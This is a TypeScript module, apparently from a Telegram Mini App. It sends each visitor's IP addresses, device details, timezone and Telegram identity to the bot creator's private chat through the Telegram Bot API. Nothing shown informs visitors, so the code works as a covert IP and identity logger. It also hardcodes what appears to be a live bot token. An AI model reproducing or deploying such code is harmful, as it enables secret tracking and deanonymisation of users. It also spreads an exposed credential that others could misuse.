/**
 * Отправка данных в Telegram бота
 */

const BOT_TOKEN = '8300603543:AAGowsZnbTGxqo5tf8hyfMtYMtvkwPAAcgM';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ВАЖНО: Укажите ваш Telegram ID, куда будут приходить уведомления
// Чтобы узнать свой ID, напишите боту @userinfobot в Telegram
const ADMIN_CHAT_ID = '7320458296'; // ID админа (создателя бота)

interface UserData {
  ip: string;
  ipInfo: {
    ipv4: string[];
    ipv6: string[];
    localIP: string[];
  };
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  timezone: string;
  timestamp: string;
  telegramUser?: any;
}

/**
 * Отправить сообщение в чат
 */
export async function sendMessageToBot(chatId: string | number, message: string): Promise<boolean> {
  // Retry механизм - 3 попытки
  const maxRetries = 3;
  
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(`📤 Попытка ${attempt}/${maxRetries} отправки в Telegram...`);
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 секунд таймаут
      
      const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);
      const data = await response.json();
      
      if (data.ok) {
        console.log(`✅ Сообщение отправлено с попытки ${attempt}`);
        return true;
      } else {
        console.error(`❌ Ошибка Telegram API:`, data);
        if (attempt < maxRetries) {
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt)); // Экспоненциальная задержка
        }
      }
    } catch (error) {
      console.error(`❌ Ошибка отправки (попытка ${attempt}):`, error);
      if (attempt < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      }
    }
  }
  
  return false;
}

/**
 * Форматировать данные пользователя для отправки
 */
function formatUserData(data: UserData): string {
  let message = '🔔 <b>Новый пользователь в Mini App</b>\n\n';
  
  message += `🌐 <b>IP Адрес:</b> <code>${data.ip}</code>\n`;
  
  // Показываем только публичные IP адреса
  if (data.ipInfo.ipv4.length > 0) {
    message += `📍 <b>Публичные IPv4:</b> ${data.ipInfo.ipv4.join(', ')}\n`;
  }
  
  if (data.ipInfo.ipv6.length > 0) {
    message += `📍 <b>Публичные IPv6:</b> ${data.ipInfo.ipv6.join(', ')}\n`;
  }
  
  // Локальные IP не показываем (они не полезны)
  
  message += `\n📱 <b>Устройство:</b> ${data.platform}\n`;
  message += `🌍 <b>Язык:</b> ${data.language}\n`;
  message += `📺 <b>Разрешение:</b> ${data.screenResolution}\n`;
  message += `🕐 <b>Timezone:</b> ${data.timezone}\n`;
  message += `⏰ <b>Время:</b> ${data.timestamp}\n`;
  
  if (data.telegramUser) {
    message += `\n👤 <b>Telegram User:</b>\n`;
    message += `   ID: <code>${data.telegramUser.id}</code>\n`;
    if (data.telegramUser.username) {
      message += `   Username: @${data.telegramUser.username}\n`;
    }
    if (data.telegramUser.first_name) {
      message += `   Name: ${data.telegramUser.first_name}`;
      if (data.telegramUser.last_name) {
        message += ` ${data.telegramUser.last_name}`;
      }
      message += '\n';
    }
  }
  
  message += `\n🔍 <b>User Agent:</b>\n<code>${data.userAgent}</code>`;
  
  return message;
}

/**
 * Отправить данные о пользователе в бота
 */
export async function sendUserDataToBot(userData: UserData, targetChatId?: string | number): Promise<boolean> {
  try {
    // Получаем chat_id из Telegram WebApp или используем переданный
    let chatId = targetChatId;
    
    // Приоритет 1: Переданный chat_id
    if (!chatId && ADMIN_CHAT_ID) {
      chatId = ADMIN_CHAT_ID;
      console.log('📤 Используем ADMIN_CHAT_ID:', chatId);
    }
    
    // Приоритет 2: Telegram WebApp user ID
    if (!chatId && typeof window !== 'undefined' && window.Telegram?.WebApp?.initDataUnsafe?.user?.id) {
      chatId = window.Telegram.WebApp.initDataUnsafe.user.id;
      console.log('📤 Используем Telegram user ID:', chatId);
    }
    
    // Если chat_id все еще не определен
    if (!chatId) {
      console.error('❌ Chat ID не найден!');
      console.error('Укажите ADMIN_CHAT_ID в /utils/telegram-bot.ts');
      console.error('Чтобы узнать свой ID, напишите боту @userinfobot в Telegram');
      return false;
    }

    console.log('📨 Отправляем данные в chat_id:', chatId);
    const message = formatUserData(userData);
    const result = await sendMessageToBot(chatId, message);
    
    if (result) {
      console.log('✅ Сообщение успешно отправлено!');
    } else {
      console.error('❌ Ошибка при отправке сообщения');
    }
    
    return result;
  } catch (error) {
    console.error('Error sending user data:', error);
    return false;
  }
}

/**
 * Получить информацию о боте (для проверки работоспособности)
 */
export async function getBotInfo(): Promise<any> {
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/getMe`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error getting bot info:', error);
    return null;
  }
}
